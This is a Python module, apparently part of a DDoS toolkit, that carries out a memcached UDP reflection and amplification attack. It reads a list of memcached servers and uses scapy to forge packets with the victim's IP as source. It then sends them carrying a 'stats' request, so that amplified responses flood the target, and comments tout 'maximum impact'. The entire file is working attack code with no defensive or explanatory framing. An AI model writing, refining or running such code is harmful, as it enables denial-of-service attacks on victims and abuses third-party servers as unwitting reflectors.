# Import modules
import random
from pathlib import Path
from scapy.all import IP, UDP, send, Raw
from colorama import Fore

# Load MEMCACHED servers list
_MEMCACHED_SERVERS: list[str] = []
try:
    _memcached_path = Path("tools/L4/memcached_servers.txt")
    if _memcached_path.exists():
        _MEMCACHED_SERVERS = [line.strip() for line in _memcached_path.read_text(encoding="utf-8").splitlines() if line.strip()]
except OSError as e:
    print(f"Warning: Could not load memcached servers: {e}")

# Payload - memcached stats request for amplification
_PAYLOAD = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def flood(target: tuple[str, int]) -> None:
    """Send memcached amplification packets.
    
    Optimized version with increased packet count and better amplification.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    if not _MEMCACHED_SERVERS:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}No memcached servers available{Fore.RESET}")
        return
    
    # Use multiple memcached servers for distributed amplification
    servers_to_use = random.sample(_MEMCACHED_SERVERS, min(len(_MEMCACHED_SERVERS), 5))
    
    # Increased packet count for maximum impact
    packets = random.randint(50, 500)
    
    for server in servers_to_use:
        try:
            packet = (
                IP(dst=server, src=target[0])
                / UDP(sport=target[1], dport=11211)
                / Raw(load=_PAYLOAD)
            )
            send(packet, count=packets // len(servers_to_use), verbose=False)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending memcached: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets // len(servers_to_use)} forged UDP packets from memcached server {server} to {target[0]}:{target[1]}.{Fore.RESET}"
            )
